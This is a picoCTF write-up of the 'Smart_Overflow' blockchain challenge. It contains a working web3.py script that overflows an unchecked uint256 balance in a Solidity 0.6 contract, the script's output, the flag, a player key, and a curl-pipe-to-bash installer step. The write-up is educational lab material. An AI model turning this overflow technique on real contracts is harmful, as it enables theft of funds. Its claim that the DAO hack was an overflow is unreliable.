# Smart_Overflow — picoCTF 2026 Writeup

**Challenge:** Smart_Overflow  
**Category:** Blockchain  
**Difficulty:** Medium  
**Flag:** `picoCTF{Sm4r7_OverFL0ws_ExI5t_01762532}`

---

## Description

Welcome! The contract tracks balances using uint256 math. It should be impossible to get the flag...

Eth node address: `mysterious-sea.picoctf.net:56275`

**Hint 1:** What happens when balances[msg.sender] becomes smaller after a deposit?

---

## Background Knowledge (Read This First!)

### What is a Smart Contract?

A **smart contract** is code that runs on the Ethereum blockchain. Once deployed, anyone can interact with its functions. This challenge uses a **Solidity** contract — Solidity is the programming language for Ethereum smart contracts.

### What is uint256?

`uint256` is an unsigned 256-bit integer — it can only hold values from `0` to `2^256 - 1`. There is no negative number. If you try to go above the maximum, it **wraps back to 0** — this is called an **integer overflow**.

```
2^256 - 1 + 1 = 0   ← overflows back to zero!
```

### Solidity 0.6.x has no overflow protection

Solidity **0.8.0+** added automatic overflow checks. But this contract uses `pragma solidity ^0.6.12` — meaning overflows happen silently with no error.

### What is web3.py?

`web3.py` is a Python library for interacting with the Ethereum blockchain — sending transactions, calling functions, and reading state.

---

## The Vulnerable Contract

```solidity
pragma solidity ^0.6.12;

contract IntOverflowBank {
    mapping(address => uint256) public balances;

    function deposit(uint256 amount) external {
        uint256 oldBalance = balances[msg.sender];
        balances[msg.sender] = balances[msg.sender] + amount;  // ← NO overflow check!

        if (!revealed && balances[msg.sender] < amount) {      // ← overflow detected here
            revealed = true;
            emit FlagRevealed(flag);                           // ← reveals flag!
        }
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }
}
```

### The Win Condition

```solidity
if (!revealed && balances[msg.sender] < amount)
```

After a deposit, if `balance < amount` — that means the balance **wrapped around** (overflowed). The contract treats this as the trigger to reveal the flag.

---

## Solution — Step by Step

### Step 1 — Install Foundry

```
┌──(zham㉿kali)-[~]
└─$ curl -L https://foundry.paradigm.xyz | bash
┌──(zham㉿kali)-[~]
└─$ source /home/zham/.zshenv
┌──(zham㉿kali)-[~]
└─$ foundryup
```

### Step 2 — Install web3.py

```
┌──(zham㉿kali)-[~]
└─$ pip install web3 --break-system-packages
```

### Step 3 — Write the exploit script

```
┌──(zham㉿kali)-[~]
└─$ nano solve_overflow.py
```

```python
from web3 import Web3

# Connection
rpc = "http://mysterious-sea.picoctf.net:56275"
w3 = Web3(Web3.HTTPProvider(rpc))

# Your details from the UI
private_key = "0x45cf0d18c9f52d799fc786d107bbb62ba8f4273a01a3769fcf4f2dea25662d5a"
player = "0xCEf6BEAF16291AFe0EE2C35d292f4880d28e2C11"
bank = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

# ABI
abi = [
    {"name": "deposit", "type": "function", "inputs": [{"name": "amount", "type": "uint256"}], "outputs": []},
    {"name": "getFlag", "type": "function", "inputs": [], "outputs": [{"name": "", "type": "string"}]},
    {"name": "revealed", "type": "function", "inputs": [], "outputs": [{"name": "", "type": "bool"}]},
]

contract = w3.eth.contract(address=bank, abi=abi)

def send_tx(fn):
    tx = fn.build_transaction({
        "from": player,
        "nonce": w3.eth.get_transaction_count(player),
        "gas": 100000,
        "gasPrice": w3.eth.gas_price,
    })
    signed = w3.eth.account.sign_transaction(tx, private_key)
    txhash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[*] tx sent: {txhash.hex()}")
    w3.eth.wait_for_transaction_receipt(txhash)
    print("[*] confirmed!")

# Step 1 - deposit 1
print("[*] Step 1: depositing 1...")
send_tx(contract.functions.deposit(1))

# Step 2 - deposit max uint256 to overflow
MAX = 2**256 - 1
print(f"[*] Step 2: depositing max uint256 ({MAX}) to overflow...")
send_tx(contract.functions.deposit(MAX))

# Step 3 - get flag
print("[*] Step 3: getting flag...")
flag = contract.functions.getFlag().call({"from": player})
print(f"\n[+] FLAG: {flag}")
```

Save with `Ctrl+O` → `Enter` → `Ctrl+X`

### Step 4 — Run the exploit

```
┌──(zham㉿kali)-[~]
└─$ python3 solve_overflow.py
> [*] Step 1: depositing 1...
> [*] tx sent: d7bb4e77f5927c1452c86217251a8f3b457bc47a808f0a438a6b5d9502d5996c
> [*] confirmed!
> [*] Step 2: depositing max uint256 (115792089237316195423570985008687907853269984665640564039457584007913129639935) to overflow...
> [*] tx sent: 9f075f76f4a7f91d9b8b8b7b221376a8a404415697b8eb322e615b6993ffef7b
> [*] confirmed!
> [*] Step 3: getting flag...
> [+] FLAG: picoCTF{Sm4r7_OverFL0ws_ExI5t_01762532}
```

✅ Got the flag! 🎯

---

## Why Two Deposits?

| Deposit | Amount | Balance After |
|---|---|---|
| Deposit 1 | `1` | `1` |
| Deposit 2 | `2^256 - 1` | `1 + (2^256-1) = 2^256 = 0` ← overflow! |

After deposit 2: `balance = 0`, but `amount = 2^256-1` → `0 < 2^256-1` is **true** → win condition triggers → flag revealed!

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `web3.py` | Connect to Ethereum node and send transactions | ⭐ Medium |
| `Foundry` | Ethereum development toolkit | ⭐ Medium |
| Python | Automate the exploit | ⭐ Easy |

---

## Key Takeaways

- **Solidity 0.6.x has no overflow protection** — always use 0.8.0+ or OpenZeppelin's `SafeMath` library for safe arithmetic
- **`uint256` wraps around** — `2^256 - 1 + 1 = 0`, not an error in old Solidity
- **Integer overflows exist on-chain too** — this is how the infamous DAO and BEC token hacks happened in real life
- The flag `Sm4r7_OverFL0ws_ExI5t` → "Smart Overflows Exist" — overflows are not just a C/binary problem

